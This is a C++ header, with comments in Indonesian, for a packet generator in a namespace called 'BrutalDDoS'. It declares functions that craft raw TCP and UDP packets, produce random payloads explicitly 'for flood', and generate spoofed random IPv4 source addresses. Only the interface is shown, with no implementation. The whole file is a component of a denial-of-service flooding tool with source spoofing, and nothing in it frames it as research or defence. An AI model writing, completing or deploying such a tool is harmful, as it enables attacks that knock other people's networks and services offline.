#pragma once

#include <cstdint>
#include <string>
#include <vector>
#include <memory>
#include <random>
#include <functional>

// Forward declarations for network structs to keep header clean
struct iphdr;
struct tcphdr;
struct udphdr;
struct ip6_hdr;

namespace BrutalDDoS {
namespace Core {

/**
 * Enum untuk jenis protokol yang bisa di-generate
 */
enum class ProtocolType {
    TCP,
    UDP,
    ICMP // Opsional, tapi kita fokus ke TCP/UDP dulu sesuai request
};

/**
 * Struktur sederhana untuk menyimpan metadata paket sebelum dikirim
 */
struct PacketMeta {
    uint32_t src_ip;
    uint32_t dst_ip;
    uint16_t src_port;
    uint16_t dst_port;
    uint8_t protocol; // IPPROTO_TCP atau IPPROTO_UDP
};

class PacketGenerator {
public:
    /**
     * Konstruktir
     * @param seed Seed untuk randomizer. Jika 0, gunakan waktu saat ini.
     */
    explicit PacketGenerator(uint32_t seed = 0);

    ~PacketGenerator() = default;

    // Non-copyable karena memiliki state random internal
    PacketGenerator(const PacketGenerator&) = delete;
    PacketGenerator& operator=(const PacketGenerator&) = delete;

    /**
     * Generate paket TCP Raw
     * @param src_ip Source IP (host byte order)
     * @param dst_ip Destination IP (host byte order)
     * @param src_port Source Port
     * @param dst_ip Destination Port
     * @param seq_num Sequence number TCP
     * @param ack_num Acknowledgment number
     * @param flags TCP Flags (e.g., SYN=0x02, ACK=0x10)
     * @param payload_size Ukuran payload dalam bytes (0 jika hanya header)
     * @return std::vector<uint8_t> berisi raw bytes paket
     */
    std::vector<uint8_t> generateTCPPacket(
        uint32_t src_ip, 
        uint32_t dst_ip, 
        uint16_t src_port, 
        uint16_t dst_port,
        uint32_t seq_num,
        uint32_t ack_num,
        uint8_t flags,
        size_t payload_size = 0
    );

    /**
     * Generate paket UDP Raw
     * @param src_ip Source IP
     * @param dst_ip Destination IP
     * @param src_port Source Port
     * @param dst_port Destination Port
     * @param payload_data Data payload sebagai string atau binary
     * @return std::vector<uint8_t> berisi raw bytes paket
     */
    std::vector<uint8_t> generateUDPPacket(
        uint32_t src_ip, 
        uint32_t dst_ip, 
        uint16_t src_port, 
        uint16_t dst_port,
        const std::vector<uint8_t>& payload_data
    );

    /**
     * Generate payload acak brutallist (untuk flood)
     * @param size Ukuran payload
     * @return std::vector<uint8_t>
     */
    std::vector<uint8_t> generateBrutalPayload(size_t size);

    /**
     * Spoofed Random IPv4 Address Generator
     * @return uint32_t Representasi IP dalam host byte order
     */
    uint32_t getRandomIPv4();

private:
    // Helper functions for checksums
    static uint16_t calculateIPChecksum(const void* data, size_t length);
    static uint16_t calculateTCPChecksum(const void* tcp_header, size_t tcp_header_len, 
                                         const void* pseudo_header, size_t pseudo_len,
                                         const void* payload, size_t payload_len);
    static uint16_t calculateUDPChecksum(const void* udp_header, size_t udp_header_len,
                                        const void* pseudo_header, size_t pseudo_len,
                                        const void* payload, size_t payload_len);

    // Internal RNG state
    std::mt19937 rng_;
    std::uniform_int_distribution<uint16_t> port_dist_;
    std::uniform_int_distribution<uint32_t> ip_dist_;
    
    // Pre-allocated buffer untuk efisiensi alokasi berulang
    std::vector<uint8_t> payload_buffer_;
};

} // namespace Core
} // namespace BrutalDDoS
